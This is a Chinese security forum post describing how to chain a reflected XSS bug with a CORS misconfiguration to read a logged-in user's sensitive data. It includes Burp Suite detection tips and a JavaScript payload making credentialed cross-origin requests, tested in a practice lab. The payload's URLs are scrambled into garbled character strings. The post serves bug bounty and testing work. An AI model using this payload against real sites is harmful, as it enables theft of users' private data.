
# [原创]反射XSS和CORS漏洞组合拳

## 前言概述：

漏洞挖掘过程中，经常会碰到一些利用场景相对困难且危害十分有限的漏洞。

还有就是有一定危害性，但是普遍被定为低危的反射型XSS漏洞，在测试过程中碰到这类漏洞真的是内心复杂，提交平台就是低危，不交吧漏洞又确实存在安全风险。

那么如何把这些“鸡肋漏洞”的危害提升一个档呢？

接下来，就是变废为宝的操作。

## 1. 反射型XSS

反射型XSS一般存在于可直接将外部输入在浏览器输出的功能之中，例如搜索、文章分类、选择时间等参数直接输出在URL中。

一般来说小厂商对反射型XSS的关注并不多，早些年反射XSS很多平台都是不收的。只有一些大厂商对反射型XSS还有一定关注度，但是因为反射型XSS需要用户配合点击构造后的URL才可以实现攻击，利用手法上和危害都有限，所以一般都是按低危处理。反射型XSS被用的最多的基本就是获取cookie，通过cookie欺骗登录受害者账号，一般也都是拿来钓鱼。

另外反射型XSS和CSRF配合也是比较常见的组合拳打法，漏洞危害同样不小。

## 2. CORS漏洞

### 2.1 原理分析

`CORS`，跨域资源共享（Cross-origin resource sharing），是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。

`CORS`漏洞存在的原因主要在于`Access-Control-Allow-Origin`参数配置失误，允许非同域站点访问本站资源。

### 2.2 漏洞特征

利用`burpsuite`可以很方便的帮助我们测试网站是否可能存在`CORS`跨域漏洞。

a.为每个请求自动加上`Origin`头

重放后可以看到靶机返回`Access-Control-Allow-Origin: foo.example.org`，且成功获取到数据，则证明存在`CORS`跨域

b.在HTTP history中筛选可能存在`CORS`跨域的请求。

只需在过滤条件中输入：

1. `Access-Control-Allow-Origin: foo.example.org`
2. `Access-Control-Allow-Credentials: true`

另外需要注意的是如果服务器配置为：

1. `Access-Control-Allow-Origin: *`
2. `Access-Control-Allow-Credentials: true`

不能证明漏洞存在，因为浏览器会自动拦截掉非认证域的请求。

### 2.2 漏洞利用

假设用户在网站`foo.com`处于登录状态，同时用户又点击了我们配置好的链接`evil.com`。

`evil.com`的网站向`foo.com`这个网站发起请求获取敏感数据，那么浏览器能否获取到`foo.com`中的敏感数据完全取决于`foo.com`配置

如果`foo.com`配置了`Access-Control-Allow-Origin`为允许接受跨域请求，则我们的`evil.com`就能获取到敏感数据，否则浏览器会因为同源策略接收不到敏感数据。

关于`CORS`漏洞，可使用开源工具`CrossSiteContentHijacking`验证

## 3. 鸡肋XSS和CORS组合拳

以KEY师傅的Dorabox靶场模拟漏洞利用，首先验证反射型XSS存在。

然后`CORS`也同时存在，假设传递了敏感参数

因为`CORS`跨域资源获取漏洞存在，那么我们可以通过让用户点击我们自己服务器上搭建的payload环境，获取到敏感数据，但是很明显这样的漏洞利用姿势成功的概率太小，这年头隔壁卖烤红薯的大爷都知道不要点陌生链接了，所以我们需要反射XSS的配合。

首先我们构造能够通过`CORS`跨域获取到敏感数据的JavaScript代码，类似于这样：

```
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.status == 200) {
    alert(this.responseText);
    document.body.innerHTML = this.responseText;
    }
};
xhttp.open("GET", "d87K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9K6b7e0R3H3x3g2)9J5c8V1c8G2M7X3q4n7L8%4S2Q4x3V1k6U0M7%4u0X3i4K6u0r3N6i4y4W2M7X3W2F1k6X3!0Q4x3X3g2H3K9s2l9`.", true);
xhttp.withCredentials = true;
xhttp.send();
}
cors();
</script>
```

简单分析一下，首先创建了一个`cors()`函数，这个函数首先判断当前的访问状态，如果是正常访问(即状态码为200)，则获取1b6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9K6b7e0R3H3x3g2)9J5c8V1c8G2M7X3q4n7L8%4S2Q4x3V1k6U0M7%4u0X3i4K6u0r3N6i4y4W2M7X3W2F1k6X3!0Q4x3X3g2H3K9s2m8Q4c8e0k6Q4z5e0k6Q4z5o6N6Q4c8e0c8Q4b7V1u0Q4b7U0k6Q4c8e0N6Q4z5f1q4Q4z5o6c8T1L8$3c8&6i4@1f1@1i4@1t1^5i4K6S2n7i4@1f1%4i4K6W2m8i4K6R3@1i4@1f1#2i4K6R3#2i4@1p5^5i4@1f1&6i4K6R3K6i4@1p5^5i4@1f1#2i4K6R3$3i4K6R3#2i4@1f1#2i4@1q4q4i4@1t1&6i4K6t1^5i4@1f1@1i4@1t1&6i4K6W2r3i4@1f1#2i4K6S2r3i4@1q4r3i4@1f1@1i4@1u0n7i4@1p5#2i4@1f1$3i4@1p5H3i4@1t1&6i4@1f1$3i4K6S2p5i4@1q4q4d9f1c8Q4c8e0S2Q4z5p5g2Q4b7U0N6Q4c8e0g2Q4z5p5k6Q4z5e0k6Q4x3U0W2Q4c8e0g2Q4b7U0W2Q4b7U0k6Q4c8e0g2Q4b7V1y4Q4b7U0W2Q4c8e0k6Q4b7e0q4Q4z5o6k6Q4c8e0g2Q4b7U0q4Q4z5e0g2Q4c8e0N6Q4b7e0c8Q4b7V1q4Q4c8e0g2Q4z5o6N6Q4b7V1q4Q4c8e0k6Q4z5f1c8Q4b7e0g2Q4c8e0y4Q4z5o6m8Q4z5o6t1`.

现在我们只需要把反射XSS的payload替换为利用`CORS`跨域获取敏感信息的payload即可：

程序成功执行。

## 总结

至此，反射XSS和`CORS`配合成功获取到用户敏感数据，虽然同样需要用户点击才能触发，但是漏洞危害足够大，如果是一些大厂的有敏感信息的站点，一般都会给高危。其实漏洞挖掘的乐趣就在于不断的发掘有趣的利用姿势，在遇到一些看似“鸡肋”的漏洞时，可以不用忙着提交，多思考一下是否可以和其他漏洞形成组合拳，这样技术才会有上升的空间，漏洞危害也会因此而提高，相应的白帽子能获得的收益也最大。

注：本文首发自云众可信

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
